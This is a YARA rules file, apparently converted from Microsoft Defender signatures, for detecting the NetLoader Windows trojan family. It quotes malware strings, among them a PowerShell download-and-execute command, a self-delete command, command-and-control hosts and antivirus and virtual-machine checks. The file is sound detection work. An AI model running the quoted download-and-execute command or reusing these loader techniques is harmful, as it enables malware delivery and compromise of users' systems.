rule Trojan_Win32_NetLoader_RPJ_2147826126_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/NetLoader.RPJ!MTB"
        threat_id = "2147826126"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "NetLoader"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {f3 a5 6a 00 6a 00 50 66 a5 8d 45 a8 50 6a 00 a4 ff 15}  //weight: 1, accuracy: High
        $x_1_2 = {51 6a 00 6a 00 6a 10 6a 00 6a 00 6a 00 6a 00 50 ff 15}  //weight: 1, accuracy: High
        $x_1_3 = "AppData\\Local\\Temp\\Jopa.exe" ascii //weight: 1
        $x_1_4 = "cdn-111.anonfiles.com" ascii //weight: 1
        $x_1_5 = "Xyi_1.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_NetLoader_RPT_2147835818_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/NetLoader.RPT!MTB"
        threat_id = "2147835818"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "NetLoader"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "101.99.90.117" ascii //weight: 1
        $x_1_2 = "65536" ascii //weight: 1
        $x_1_3 = "POST /contacts HTTP/1.1" ascii //weight: 1
        $x_1_4 = "manage.py" ascii //weight: 1
        $x_1_5 = "Defender" ascii //weight: 1
        $x_1_6 = "temp\\log.zip" ascii //weight: 1
        $x_1_7 = "python\\pythonw.exe" ascii //weight: 1
        $x_1_8 = "heathen.pdb" ascii //weight: 1
        $x_1_9 = "CreateToolhelp32Snapshot" ascii //weight: 1
        $x_1_10 = "Process32NextW" ascii //weight: 1
        $x_1_11 = "explorer.exe" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_NetLoader_RPH_2147836593_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/NetLoader.RPH!MTB"
        threat_id = "2147836593"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "NetLoader"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "osecweb.ir/js" wide //weight: 1
        $x_1_2 = "/c \"powershell -command IEX(New-Object Net.Webclient).DownloadString('%s/%s')\"" wide //weight: 1
        $x_1_3 = "/c ping 127.0.0.1 && del \"%s\" >> NUL" wide //weight: 1
        $x_1_4 = "config_20.ps1" wide //weight: 1
        $x_1_5 = "config_40.ps1" wide //weight: 1
        $x_1_6 = "ShellExecuteW" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_NetLoader_CA_2147838516_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/NetLoader.CA!MTB"
        threat_id = "2147838516"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "NetLoader"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\\\\.\\PhysicalDrive0" ascii //weight: 1
        $x_1_2 = "D:\\cangku\\WinOsClientProject\\Release-exe\\" ascii //weight: 1
        $x_1_3 = "K7TSecurity.exe" ascii //weight: 1
        $x_1_4 = "f-secure.exe" ascii //weight: 1
        $x_1_5 = "QuickHeal" ascii //weight: 1
        $x_1_6 = "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0" ascii //weight: 1
        $x_1_7 = "XP-sp1" ascii //weight: 1
        $x_1_8 = "Vista-sp1" ascii //weight: 1
        $x_1_9 = "VMwareService.exe" ascii //weight: 1
        $x_1_10 = "[tab]" ascii //weight: 1
        $x_1_11 = "[enter]" ascii //weight: 1
        $x_1_12 = "Application Data\\sys.key" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_NetLoader_RPX_2147895426_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/NetLoader.RPX!MTB"
        threat_id = "2147895426"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "NetLoader"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {8d 4c 24 10 51 68 00 10 00 00 8d 54 24 30 52 33 ff 55 33 f6 89 7c 24 20 ff d3 85 c0}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_NetLoader_MBEP_2147895754_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/NetLoader.MBEP!MTB"
        threat_id = "2147895754"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "NetLoader"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4b 5b 32 0c 1f 89 da d1 ea 83 c3 02 88 0c 17 81 fb ?? ?? ?? ?? 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_NetLoader_MBER_2147895839_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/NetLoader.MBER!MTB"
        threat_id = "2147895839"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "NetLoader"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8a 4c 1f 01 32 0c 1f 89 da d1 ea 83 c3 02 88 0c 17 81 fb ?? ?? ?? ?? 60 89 fa 89 d1 61 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_NetLoader_AW_2147901247_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/NetLoader.AW!MTB"
        threat_id = "2147901247"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "NetLoader"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {be e6 81 db 06 4e 5e 9d 32 06 60 fd 89 c6 57 59 fc 61 88 07}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_NetLoader_RPY_2147904051_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/NetLoader.RPY!MTB"
        threat_id = "2147904051"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "NetLoader"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {8b 55 fc 03 51 3c 89 55 e8 8b 45 e8 8b 4d fc 03 48 78 89 4d e0 8b 55 e0 8b 45 fc 03 42 20 89 45 e4 8b 4d e0}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_NetLoader_RPZ_2147904052_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/NetLoader.RPZ!MTB"
        threat_id = "2147904052"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "NetLoader"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8a cb 32 4d fb 89 45 bc 8b 45 08 88 4c 15 f4 8b 0d ?? ?? ?? ?? 88 44 0d f5 85 f6 74 08 8a 55 f4 88 14 07}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

